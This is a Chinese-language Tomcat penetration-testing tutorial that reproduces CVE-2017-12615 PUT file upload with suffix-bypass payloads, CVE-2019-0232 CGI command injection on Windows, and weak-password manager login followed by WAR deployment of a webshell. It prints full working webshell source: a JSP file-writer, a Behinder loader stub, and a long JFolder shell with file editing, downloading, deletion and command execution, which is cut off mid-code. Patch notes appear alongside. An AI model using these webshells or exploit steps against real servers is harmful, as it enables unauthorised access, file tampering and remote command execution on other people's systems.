Tomcat
======

前言
==

Tomcat服务器是一个免费的开放源代码的web应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP程序的首选。可以这样认为，当在一台机器上配置好 Apache服务器，可利用它响应HTML页面的访问请求。实际上 Tomcat是 Apache服务器的扩展，但运行时它是独立运行的，所以当运行 tomcat时，它实际上作为一个与 Apache独立的进程单独运行的。

**目前版本型号7~10版本**

**默认端口：8080**

安装
--

首先要有java的环境

**注意：Tomcat的版本对与JAVA版本以及相应的JSP和 Servlet都是有要求的，Tomcat8版本以上的是需要Java7及以后的版本，所以需要对应JDK的版本来下载Tomcat的版本**

![1619271446048](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f0e66c59e46d29ad164eefe123078322cabee651.png)

然后安装Tomcat 一路默认下来 就ok了

![1619263844479](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dd5da8677491338f0aec82116253fa420643713f.png)

可以看到它的8080端口 已经开启了

![1619263320303](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-681ac57c6c04ec94f804cb72b926ab1d5bc2de45.png)

访问一下

![1619275501351](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1b407e773df4a8165a5817103e6e8c1dbc2731b3.png)

Tomcat分析
--------

### 主要文件

```php
1.server.x ml：配置 tomcat启动的端口号、host主机、Context等
2.web.x ml:部署描述文件，这个web.x ml中描述了一些默认的 servlet，部署每个 webapp时，都会调用这个文件，配置该web应用的默认 servlet 
3：tomcat-users.x ml:tomcat的用户密码与权限。
```

![1619276500737](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8415b4299da27d50cdfd35badb8c430f715bbaf0.png)

### 上传目录

![1619276550079](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-cd716c9e68aabc95dabcefd403fba8d79deabbd6.png)

Tomcat渗透
--------

### Tomcat任意文件写入(CVE-2017-12615）

#### 影响范围

Apache Tomcat7.0.0-7.0.81（默认配置）

#### 复现

这边我用vulhub

```php
sudo service docker start 
cd vulhub/tomcat/CVE-2017-12615
sudo docker-compose build
sudo docker-compose up -d
```

![1619279493073](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f1bcd9ec7e8b6802eaf12492b17ab61334e3b4ec.png)

去底层看看源码

```php
sudo docker ps
sudo docker exec -ti a3 bash
cat conf/web.x ml |grep readonly
```

![1619279550159](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6956bbc7092e246e65455113f74b90efe84a122e.png)

![1619279602920](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a9e0284732269d9ae28d8186df941649a66bfa4e.png)

#### 漏洞原理

产生是由于配置不当（非默认配置），将配置文件`conf/web.x ml`中的 `readonly`设置为了 false，导致可以使用PUT方法上传任意文件，但限制了jsp后缀，不过对于不同平台有多种绕过方法

#### 开始复现

抓包 改位PUT 上传方式

![1619279695848](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fc2d8c48612810fabd2d0ab632de2d2db4b6d63a.png)

去上传目录看看

```php
/usr/local/tomcat/webapps/ROOT
```

![1619279779246](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f1b40de612cb8652145db3481694fc39f7adf204.png)

成功上传

##### 绕过，成功上传jsp

```php
1.Windows下不允许文件以空格结尾
以PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格
2.WindowsNTFS流
Put/a001.jsp::$DATA HTTP/1.1
3. /在文件名中是非法的，也会被去除（Linux/Windows）
Put/a001.jsp/http:/1.1
```

可以看到上传a001.jsp 是成功绕过了

![1619280114887](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-224b64b88a7e7777f9418aa0d9af7d441ea4290c.png)

![1619280208227](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b566be029a888284752ebc7b467b60857b87ef30.png)

其他两种我就不进行演示了

都是可以的

上传马儿，这边我用冰蝎进行连接

**注意：不能开代理**

看看冰蝎server目录下的jsp马儿

![1619280600919](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-06144ac56a4f0c947a792f1959470b85b7d3d583.png)

![1619280689842](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2ee00bca0599421b0c49b9c6ede2f32b55da2d3c.png)

冰蝎的jsp马儿

```php
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%                                                                                                                                                                                                                                                                                                                                                   %>
```

```php
/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
```

注意这边要用`/`进行绕过,上传jsp

![1619281552614](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a2d34419d8b29a4cec224985410c1888d50f265f.png)

也可以看到是成功上传的

![1619281576850](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9f932d206b7eec734f8fb1321847d073e7d3dfb4.png)

![1619281594138](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a4cc95f7859f62e289ed10ddfc22c0340f81172e.png)

用冰蝎进行连接一下

![1619281681804](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5705756e2e6309d906ee237a53bc82db757cc22c.png)

##### 最新版本复现

这边把这个漏洞的代码 粘贴进最新的版本

不加的话 PUT 上传txt都是不可以的

```php
<init-param>
 <param-name>readonly</param-name>
 <param-value>false</param-value>
</init-param>
```

![1619316374088](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3a1fe13035e9031655d64e07ade909130554d4f1.png)

保存退出 进行重启Tomcat

![1619316427883](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4383f4972ab8b09a8263119b903bde6c441dccf3.png)

![1619316466768](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4135979efc3e29c70baa78d243c8f3dfb5f3846b.png)

![1619316534173](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d48f5c001e87c1817c3d355249218f2f2dd6e282.png)

确实是可以成功写入的

![1619316568424](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8096c91a05ec7631820310af70c8b506f66210ef.png)

进行PUT写入txt 发现它是可以的

但是绕过，上传jsp 三种方法我都试了 是不行的

##### 修复

把readonly 改成true

```php
<init-param> <param-name>readonly</param-name> <param-value>false</param-value></init-param>
```

### Tomcat远程代码执行（CVE-2019-0232）

#### 影响范围

```php
Apache Tomcat 9.0.0.M1 to 9.0.17Apache Tomcat 8.5.0 to 8.5.39Apache Tomcat 7.0.0 to 7.0.93
```

这边就用 Windows 8.5.39 进行复现

#### 安装

同样是先安装java

![1619317164402](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9c0c1a2975db5c2dbb2e1eec773738f9f9c86142.png)

然后安装Tomcat

![1619317181551](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e280afc624a17acd7371e12e033d168f7db30048.png)

![1619317197793](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8e4db18f604597fd6449729b124d6b8865428377.png)

访问一下

![1619317352951](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e67ddda37280953ad34357f698d2c2adc9716299.png)

#### 漏洞原理

漏洞相关的代码在 `tomcat\java\org\apache\catalina\servlets\CGIServlet.java`中，CGISerlvet提供了一个`cgi`的调用接口，在启用`enableCmdLineArguments`参数时，会根据`RFC 3875`来从Url参数中生成命令行参数，并把参数传递至Java的 `Runtime`执行。

**这个漏洞是因为`Runtime.getRuntime().exec`在 Windows中和 Linux中底层实现不同导致的**

Java的Runtime.getRuntime().exec在CGI调用这种情况下很难有命令注入。

而 Windows中创建进程使用的是 CreateProcess，会将参数合并成字符串，作为 `lpComandLine`传入 CreateProcess。程序启动后调用`GetcommandLine`获取参数，并调用`CommandLineToArgw`传至argv

在 Windows中，当`CreateProcess`中的参数为bat文件或是cmd文件时，会调用 cmd.exe，故最后会变成`cmd.exe /c "a001.bat dir"`，而Java的调用过程并没有做任何的转义，所以在 Windows下会存在漏洞。

除此之外，Windows在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过

例如`dir "\"&whoami"`在 Linux中是安全的，而在Windows会执行命令。  
这是因为 Windows在处理命令行参数时，会将`"`中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个`"`，但是对`"`的处理有误。因此在Java中调用批处理或者cmd文件时，需要做合适的参数检査才能避免漏洞岀现。

#### 漏洞分析

Tomcat的 CGI\_Servlet组件默认是关闭的，在`conf/web.x ml`中找到注释的 CGIServlet部分，去掉注释，并配置 enableCmdLineArguments和executable

![1619326835356](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dfa04193bf6a707882d072e68b089d207b4b6be7.png)

就是配置这里

```php
<servlet>    <servlet-name>cgi</servlet-name>    <servlet-class>org.apache.catalina.servlets.CGIServlet</servlet-class>    <init-param>        <param-name>cgiPathPrefix</param-name>        <param-value>WEB-INF/cgi</param-value>    </init-param>    <init-param>        <param-name>enableCmdLineArguments</param-name>     <param-value>true</param-value> </init-param>   <init-param>        <param-name>executable</param-name>     <param-value></param-value> </init-param>    <load-on-startup>5</load-on-startup></servlet>
```

这里主要的设置是enableCmdLineArguments和 executable两个选项

```php
1.enableCmdLineArguments启用后才会将Url中的参数传递到命令行2.executable指定了执行的二进制文件，默认是perl，需要置为空才会执行文件本身。
```

同样在conf/web.x ml中启用cgi的 servlet-mapping

![1619326964457](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1269ed5263be0fb14b0e156ba21c5ba09216125b.png)

修改conf/context.x ml的添加 privileged="true"属性，否则会没有权限

```php
<Context privileged="true">
```

![1619327075870](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6b2570cd7137c7e243cc83380dd50b5c78cd86be.png)

配置目录文件

在`C:\Tomcat\webapps\ROOT\WEB-INF`下创建`cgi-bin`目录

并在该目录下创建一个a001.txt

里面内容随意

![1619327411223](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ee269dc875bc75d5a21b6d010c75d54955c998f1.png)

![1619327400322](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ac5547e0d589be1129be1d0b450befdf29e4a7f9.png)

记得重启一下

![1619327485133](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c7b2b6633f8a4a3bc4eb34443d46bd4200eb6d24.png)

然后我们访问

```php
http://192.168.175.193:8080/cgi-bin/a001.bat?&dir
```

可以看到成功任意代码执行！

#### 修复方式

开发者在 patch中增加了 `cmdLineArgumentsDecoded`参数，这个参数用来校验传入的命令行参数，如果传入的命令行参数不符合规定的模式，则不执行。  
校验写在 setupFromRequest函数中

```php
String decodedArgument = URLDecoder.decode(encodedArgument, parameterEncoding);if (cmdLineArgumentsDecodedPattern != null && !cmdLineArgumentsDecodedPattern.matcher(decodedArgument).matches()) { if (log.isDebugEnabled()) { log.debug(sm.getString("cgiServlet.invalidArgumentDecoded", decodedArgument, cmdLineArgumentsDecodedPattern.toString())); } return false;}
```

不通过时，会将 CGIEnvironment的`valid`参数设为 false，在之后的处理函数中会直接跳过执行

```php
if (cgiEnv.isValid()) { CGIRunner cgi = new CGIRunner(cgiEnv.getCommand(), cgiEnv.getEnvironment(), cgiEnv.getWorkingDirectory(), cgiEnv.getParameters()); if ("POST".equals(req.getMethod())) { cgi.setInput(req.getInputStream()); } cgi.setResponse(res); cgi.run();} else { res.sendError(404);}
```

#### 修复建议

```php
1.使用更新版本的 Apache Tomcat。这里需要注意的是，虽然在9.0.18就修复了这个漏洞，但这个更新是并没有通过候选版本的投票，所以虽然9.0.18没有在被影响的列表中，用户仍需要下载9.0.19的版本来获得没有该漏洞的版本2.关闭 enableCmdLineArguments参数
```

### Tomcat弱口令&amp;后台getshell漏洞

#### 影响范围

Tomcat8

这边就还是用vulhub进行复现

```php
cd vulhub-master/tomcat/tomcat8sudo docker-compose up -d
```

![1619329013757](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-6492290bc0d0207425e58863b5b4816c0f71baf7.png)

之前的容器要关掉

去docker底层看看它的源码

```php
sudo docker pssudo docker exec -ti a bashcd conf
```

把这三个文件复制出来

```php
sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/tomcat-users.x ml /home/dayu/Desktop/sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/tomcat-users.xsd /home/dayu/Desktop/sudo docker cp 5e81d6d51622:/usr/local/tomcat/conf/web.x ml /home/dayu/Desktop/
```

![1619329131808](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-27deba55dbcecebdbf1e1e6765a5b1d293cb44e0.png)

![1619329484692](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5b2f28126d3ce1e56f54aa5717e58d1ac4a2b6af.png)

![1619329494731](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7e5f16ea50d68f8b14535bf45c0492bb702f790f.png)

源码

```php
<?x ml version="1.0" encoding="UTF-8"?><tomcat-users x mlns="http://tomcat.apache.org/x ml" x mlns:xsi="http://www.w3.org/2001/x mlSchema-instance" xsi:schemaLocation="http://tomcat.apache.org/x ml tomcat-users.xsd" version="1.0"> <role rolename="manager-gui"/> <role rolename="manager-s cript"/> <role rolename="manager-jmx"/> <role rolename="manager-status"/> <role rolename="admin-gui"/> <role rolename="admin-s cript"/> <user username="tomcat" password="tomcat" roles="manager-gui,manager-s cript,manager-jmx,manager-status,admin-gui,admin-s cript" /> </tomcat-users>
```

manager（后台管理）

```php
manager-gui     拥有htmL页面权限manager-status  拥有查看 status的权限manager-s cript  拥有text接口的权限，和 status权限manager-jmx     拥有jmx权限，和 status权限
```

host-manager（虚拟主机管理

```php
admin-gui    拥有html页面权限admin-s cript 拥有text接口权限
```

访问一下

![1619329569867](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-045607ac81e2ddcb4bdd80dcfbeed9408bb5ded0.png)

访问一下它的后台管理地址

```php
/manager/html
```

![1619329613901](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c76ae6be6198eea2141ac585aa4d678dabaee65b.png)

或者点这里

![1619329717080](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e857275ac0f669e1a745fc5c4014bf5bd6abb254.png)

它的登录窗口是没有验证码的 直接爆破就可以

默认

```php
Users：TomcatPasswd：Tomcat
```

登录进去之后 进行查看

![1619329890433](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fdce4d9df56ec3ced7ee8c6de010d7f2f8eb7ee2.png)

**为什么需要上传wa包，为什么不是 tar.zip？？**

war包是用来进行Web开发时一个网站项目下的所有代码，包括前台HTML/CSS/JS代码，以及后台 JavaWeb的代码。当开发人员开发完毕时，就会将源码打包给测试人员测试，测试完后若要发布则也会打包成War包进行发布。War包可以放在Tomcat下的webapps或word目录，当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。

上传JSP的大马

```php
<%@page contentType="text/html;charset=gb2312"%>    <%@page import="java.io.*,java.util.*,java.net.*"%>    <html>      <head>        <title></title>        <style type="text/css">         body { color:red; font-size:12px; background-color:white; }        </style>      </head>      <body>      <%       if(request.getParameter("context")!=null)       {       String context=new String(request.getParameter("context").getBytes("ISO-8859-1"),"gb2312");       String path=new String(request.getParameter("path").getBytes("ISO-8859-1"),"gb2312");       OutputStream pt = null;            try {                pt = new FileOutputStream(path);                pt.write(context.getBytes());                out.println("<a href='"+request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+request.getRequestURI()+"'><font color='red' title='点击可以转到上传的文件页面!'>上传成功!</font></a>");            } catch (FileNotFoundException ex2) {                out.println("<font color='red'>上传失败!</font>");            } catch (IOException ex) {                out.println("<font color='red'>上传失败!</font>");            } finally {                try {                    pt.close();                } catch (IOException ex3) {                    out.println("<font color='red'>上传失败!</font>");                }            }    }      %>        <form name="frmUpload" method="post" action="">        <font color="blue">本文件的路径:</font><%out.print(request.getRealPath(request.getServletPath())); %>        <br>        <br>        <font color="blue">上传文件路径:</font><input type="text" size="70" name="path" value="<%out.print(getServletContext().getRealPath("/")); %>">        <br>        <br>        上传文件内容:<textarea name="context" id="context" style="width: 51%; height: 150px;"></textarea>        <br>        <br>        <input type="submit" name="btnSubmit" value="Upload">        </form>      </body>    </html>   
```

zip压缩 然后改后缀 成war的包

或者使用Java命令：

```php
jar -cvf dayu.war dayu.jsp
```

![1619339840138](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1719874aac9ed7b379316712778f4ad6e13c8dea.png)

![1619339862773](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2b47fa7cd2074f66973255b430c15c9d6033d7fc.png)

这里的`/2` 就是war包的名字

去docker底层看看是否成功上传

![1619339911577](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4bf48c830a03968c211befff73abdb3b759d871d.png)

它会自动部署 那我们访问一下

![1619332041600](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-9993395f1fa62ab15ea86620431c18f7d584a5a2.png)

成功解析jsp大马，并能 upload上传功能！

这里上传冰蝎的jsp马儿

```php
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%                                                                                                                                                                                                                                                                                                                                                   %>
```

```php
/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
```

![1619340379288](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-66d6cda8a9422e9503a419890e6c4ffac0944222.png)

upload之后 上冰蝎进行连接

![1619340324001](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fe97939bfa547f1166502f14160167d736d6a54e.png)

![1619340439690](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-19767e72e36b8b576a382c69686dbb9ddcfc658f.png)

在贴一个牛逼的JSP大马

```php
<%/**JFolder V0.9  windows platform@Filename： JFolder.jsp @Des cription： 一个简单的系统文件目录显示程序，类似于资源管理器，提供基本的文件操作，不过功能较弱。@Bugs  :  下载时，中文文件名无法正常显示*/%><%@ page contentType="text/html;charset=gb2312"%><%@page import="java.io.*,java.util.*,java.net.*" %><%!private final static int languageNo=0; //语言版本，0 : 中文； 1：英文String strThisFile="JFolder.jsp";String[] authorInfo={" <font color=red> 岁月联盟-专用版 </font>"," <font color=red> Thanks for your support - - by Steven Cee http:// </font>"};String[] strFileManage   = {"文 件 管 理","File Management"};String[] strCommand      = {"CMD 命 令","Command Window"};String[] strSysProperty  = {"系 统 属 性","System Property"};String[] strHelp         = {"帮 助","Help"};String[] strParentFolder = {"上级目录","Parent Folder"};String[] strCurrentFolder= {"当前目录","Current Folder"};String[] strDrivers      = {"驱动器","Drivers"};String[] strFileName     = {"文件名称","File Name"};String[] strFileSize     = {"文件大小","File Size"};String[] strLastModified = {"最后修改","Last Modified"};String[] strFileOperation= {"文件操作","Operations"};String[] strFileEdit     = {"修改","Edit"};String[] strFileDown     = {"下载","Download"};String[] strFileCopy     = {"复制","Move"};String[] strFileDel      = {"删除","Delete"};String[] strExecute      = {"执行","Execute"};String[] strBack         = {"返回","Back"};String[] strFileSave     = {"保存","Save"};public class FileHandler{ private String strAction=""; private String strFile=""; void FileHandler(String action,String f) {  }}public static class UploadMonitor {  static Hashtable uploadTable = new Hashtable();  static void set(String fName, UplInfo info) {   uploadTable.put(fName, info);  }  static void remove(String fName) {   uploadTable.remove(fName);  }  static UplInfo getInfo(String fName) {   UplInfo info = (UplInfo) uploadTable.get(fName);   return info;  }}public class UplInfo {  public long totalSize;  public long currSize;  public long starttime;  public boolean aborted;  public UplInfo() {   totalSize = 0l;   currSize = 0l;   starttime = System.currentTimeMillis();   aborted = false;  }  public UplInfo(int size) {   totalSize = size;   currSize = 0;   starttime = System.currentTimeMillis();   aborted = false;  }  public String getUprate() {   long time = System.currentTimeMillis() - starttime;   if (time != 0) {    long uprate = currSize * 1000 / time;    return convertFileSize(uprate) + "/s";   }   else return "n/a";  }  public int getPercent() {   if (totalSize == 0) return 0;   else return (int) (currSize * 100 / totalSize);  }  public String getTimeElapsed() {   long time = (System.currentTimeMillis() - starttime) / 1000l;   if (time - 60l >= 0){    if (time % 60 >=10) return time / 60 + ":" + (time % 60) + "m";    else return time / 60 + ":0" + (time % 60) + "m";   }   else return time<10 ? "0" + time + "s": time + "s";  }  public String getTimeEstimated() {   if (currSize == 0) return "n/a";   long time = System.currentTimeMillis() - starttime;   time = totalSize * time / currSize;   time /= 1000l;   if (time - 60l >= 0){    if (time % 60 >=10) return time / 60 + ":" + (time % 60) + "m";    else return time / 60 + ":0" + (time % 60) + "m";   }   else return time<10 ? "0" + time + "s": time + "s";  } } public class FileInfo {  public String name = null, clientFileName = null, fileContentType = null;  private byte[] fileContents = null;  public File file = null;  public StringBuffer sb = new StringBuffer(100);  public void setFileContents(byte[] aByteArray) {   fileContents = new byte[aByteArray.length];   System.arraycopy(aByteArray, 0, fileContents, 0, aByteArray.length);  }}// A Class with methods used to process a ServletInputStreampublic class HttpMultiPartParser {  private final String lineSeparator = System.getProperty("line.separator", "\n");  private final int ONE_MB = 1024 * 1;  public Hashtable processData(ServletInputStream is, String boundary, String saveInDir,    int clength) throws IllegalArgumentException, IOException {   if (is == null) throw new IllegalArgumentException("InputStream");   if (boundary == null || boundary.trim().length() < 1) throw new IllegalArgumentException(     "\"" + boundary + "\" is an illegal boundary indicator");   boundary = "--" + boundary;   StringTokenizer stLine = null, stFields = null;   FileInfo fileInfo = null;   Hashtable dataTable = new Hashtable(5);   String line = null, field = null, paramName = null;   boolean saveFiles = (saveInDir != null && saveInDir.trim().length() > 0);   boolean isFile = false;   if (saveFiles) { // Create the required directory (including parent dirs)    File f = new File(saveInDir);    f.mkdirs();   }   line = getLine(is);   if (line == null || !line.startsWith(boundary)) throw new IOException(     "Boundary not found; boundary = " + boundary + ", line = " + line);   while (line != null) {    if (line == null || !line.startsWith(boundary)) return dataTable;    line = getLine(is);    if (line == null) return dataTable;    stLine = new StringTokenizer(line, ";\r\n");    if (stLine.countTokens() < 2) throw new IllegalArgumentException(      "Bad data in second line");    line = stLine.nextToken().toLowerCase();    if (line.indexOf("form-data") < 0) throw new IllegalArgumentException(      "Bad data in second line");    stFields = new StringTokenizer(stLine.nextToken(), "=\"");    if (stFields.countTokens() < 2) throw new IllegalArgumentException(      "Bad data in second line");    fileInfo = new FileInfo();    stFields.nextToken();    paramName = stFields.nextToken();    isFile = false;    if (stLine.hasMoreTokens()) {     field = stLine.nextToken();     stFields = new StringTokenizer(field, "=\"");     if (stFields.countTokens() > 1) {      if (stFields.nextToken().trim().equalsIgnoreCase("filename")) {       fileInfo.name = paramName;       String value = stFields.nextToken();       if (value != null && value.trim().length() > 0) {        fileInfo.clientFileName = value;        isFile = true;       }       else {        line = getLine(is); // Skip "Content-Type:" line        line = getLine(is); // Skip blank line        line = getLine(is); // Skip blank line        line = getLine(is); // Position to boundary line        continue;       }      }     }     else if (field.toLowerCase().indexOf("filename") >= 0) {      line = getLine(is); // Skip "Content-Type:" line      line = getLine(is); // Skip blank line      line = getLine(is); // Skip blank line      line = getLine(is); // Position to boundary line      continue;     }    }    boolean skipBlankLine = true;    if (isFile) {     line = getLine(is);     if (line == null) return dataTable;     if (line.trim().length() < 1) skipBlankLine = false;     else {      stLine = new StringTokenizer(line, ": ");      if (stLine.countTokens() < 2) throw new IllegalArgumentException(        "Bad data in third line");      stLine.nextToken(); // Content-Type      fileInfo.fileContentType = stLine.nextToken();     }    }if (skipBlankLine) {     line = getLine(is);     if (line == null) return dataTable;    }    if (!isFile) {     line = getLine(is);     if (line == null) return dataTable;     dataTable.put(paramName, line);     // If parameter is dir, change saveInDir to dir     if (paramName.equals("dir")) saveInDir = line;     line = getLine(is);     continue;    }    try {     UplInfo uplInfo = new UplInfo(clength);     UploadMonitor.set(fileInfo.clientFileName, uplInfo);     OutputStream os = null;     String path = null;     if (saveFiles) os = new FileOutputStream(path = getFileName(saveInDir,       fileInfo.clientFileName));     else os = new ByteArrayOutputStream(ONE_MB);     boolean readingContent = true;     byte previousLine[] = new byte[2 * ONE_MB];     byte temp[] = null;     byte currentLine[] = new byte[2 * ONE_MB];     int read, read3;     if ((read = is.readLine(previousLine, 0, previousLine.length)) == -1) {      line = null;      break;     }     while (readingContent) {      if ((read3 = is.readLine(currentLine, 0, currentLine.length)) == -1) {       line = null;       uplInfo.aborted = true;       break;      }      if (compareBoundary(boundary, currentLine)) {       os.write(previousLine, 0, read - 2);       line = new String(currentLine, 0, read3);       break;      }      else {       os.write(previousLine, 0, read);       uplInfo.currSize += read;       temp = currentLine;       currentLine = previousLine;       previousLine = temp;       read = read3;      }//end else     }//end while     os.flush();     os.close();     if (!saveFiles) {      ByteArrayOutputStream baos = (ByteArrayOutputStream) os;      fileInfo.setFileContents(baos.toByteArray());     }     else fileInfo.file = new File(path);     dataTable.put(paramName, fileInfo);     uplInfo.currSize = uplInfo.totalSize;    }//end try    catch (IOException e) {     throw e;    }   }   return dataTable;  }  /**   * Compares boundary string to byte array   */  private boolean compareBoundary(String boundary, byte ba[]) {   byte b;   if (boundary == null || ba == null) return false;   for (int i = 0; i < boundary.length(); i++)    if ((byte) boundary.charAt(i) != ba[i]) return false;   return true;  }  /** Convenience method to read HTTP header lines */  private synchronized String getLine(ServletInputStream sis) throws IOException {   byte b[] = new byte[1024];   int read = sis.readLine(b, 0, b.length), index;   String line = null;   if (read != -1) {    line = new String(b, 0, read);    if ((index = line.indexOf('\n')) >= 0) line = line.substring(0, index - 1);   }   return line;  }  public String getFileName(String dir, String fileName) throws IllegalArgumentException {   String path = null;   if (dir == null || fileName == null) throw new IllegalArgumentException(     "dir or fileName is null");   int index = fileName.lastIndexOf('/');   String name = null;   if (index >= 0) name = fileName.substring(index + 1);   else name = fileName;   index = name.lastIndexOf('\\');   if (index >= 0) fileName = name.substring(index + 1);   path = dir + File.separator + fileName;   if (File.separatorChar == '/') return path.replace('\\', File.separatorChar);   else return path.replace('/', File.separatorChar);  }} //End of class HttpMultiPartParserString formatPath(String p){ StringBuffer sb=new StringBuffer(); for (int i = 0; i < p.length(); i++)  {  if(p.charAt(i)=='\\')  {   sb.append("\\\\");  }  else  {   sb.append(p.charAt(i));  } } return sb.toString();} /**  * Converts some important chars (int) to the corresponding html string  */ static String conv2Html(int i) {  if (i == '&') return "&amp;";  else if (i == '<') return "&lt;";  else if (i == '>') return "&gt;";  else if (i == '"') return "&quot;";  else return "" + (char) i; } /**  * Converts a normal string to a html conform string  */ static String htmlEncode(String st) {  StringBuffer buf = new StringBuffer();  for (int i = 0; i < st.length(); i++) {   buf.append(conv2Html(st.charAt(i)));  }  return buf.toString(); }String getDrivers()/**Windows系统上取得可用的所有逻辑盘*/{ StringBuffer sb=new StringBuffer(strDrivers[languageNo] + " : "); File roots[]=File.listRoots(); for(int i=0;i<roots.length;i++) {  sb.append(" <a href=\"j avas cript:doForm('','"+roots[i]+"\\','','','1','');\">");  sb.append(roots[i]+"</a>&nbsp;"); } return sb.toString();}static String convertFileSize(long filesize){ //bug 5.09M 显示5.9M String strUnit="Bytes"; String strAfterComma=""; int intDivisor=1; if(filesize>=1024*1024) {  strUnit = "MB";  intDivisor=1024*1024; } else if(filesize>=1024) {  strUnit = "KB";  intDivisor=1024; } if(intDivisor==1) return filesize + " " + strUnit; strAfterComma = "" + 100 * (filesize % intDivisor) / intDivisor ; if(strAfterComma=="") strAfterComma=".0"; return filesize / intDivisor + "." + strAfterComma + " " + strUnit;}%><%request.setCharacterEncoding("gb2312");String tabID = request.getParameter("tabID");String strDir = request.getParameter("path");String strAction = request.getParameter("action");String strFile = request.getParameter("file");String strPath = strDir + "\\" + strFile; String strCmd = request.getParameter("cmd");StringBuffer sbEdit=new StringBuffer("");StringBuffer sbDown=new StringBuffer("");StringBuffer sbCopy=new StringBuffer("");StringBuffer sbSaveCopy=new StringBuffer("");StringBuffer sbNewFile=new StringBuffer("");if((tabID==null) || tabID.equals("")){ tabID = "1";}if(strDir==null||strDir.length()<1){ strDir = request.getRealPath("/");}if(strAction!=null && strAction.equals("down")){ File f=new File(strPath); if(f.length()==0) {  sbDown.append("文件大小为 0 字节，就不用下了吧"); } else {  response.setHeader("content-type","text/html; charset=ISO-8859-1");  response.setContentType("APPLICATION/OCTET-STREAM");   response.setHeader("Content-Disposition","attachment; filename=\""+f.getName()+"\"");  FileInputStream fileInputStream =new FileInputStream(f.getAbsolutePath());  out.clearBuffer();  int i;  while ((i=fileInputStream.read()) != -1)  {   out.write(i);   }  fileInputStream.close();  out.close(); }}if(strAction!=null && strAction.equals("del")){ File f=new File(strPath); f.delete();}if(strAction!=null && strAction.equals("edit")){ File f=new File(strPath);  BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(f))); sbEdit.append("<form name='frmEdit' action='' method='POST'>\r\n"); sbEdit.append("<input type=hidden name=action value=save >\r\n"); sbEdit.append("<input type=hidden name=path value='"+strDir+"' >\r\n"); sbEdit.append("<input type=hidden name=file value='"+strFile+"' >\r\n"); sbEdit.append("<input type=submit name=save value=' "+strFileSave[languageNo]+" '> "); sbEdit.append("<input type=button name=goback value=' "+strBack[languageNo]+" ' o nclick='history.back(-1);'> &nbsp;"+strPath+"\r\n"); sbEdit.append("<br><textarea rows=30 cols=90 name=content>"); String line=""; while((line=br.readLine())!=null) {  sbEdit.append(htmlEncode(line)+"\r\n");   }   sbEdit.append("</textarea>"); sbEdit.append("<input type=hidden name=path value="+strDir+">"); sbEdit.append("</form>");}if(strAction!=null && strAction.equals("save")){ File f=new File(strPath); BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f))); String strContent=request.getParameter("content"); bw.write(strContent); bw.close();}if(strAction!=null && strAction.equals("copy")){ File f=new File(strPath); sbCopy.append("<br><form name='frmCopy' action='' method='POST'>\r\n"); sbCopy.append("<input type=hidden name=action value=savecopy >\r\n"); sbCopy.append("<input type=hidden name=path 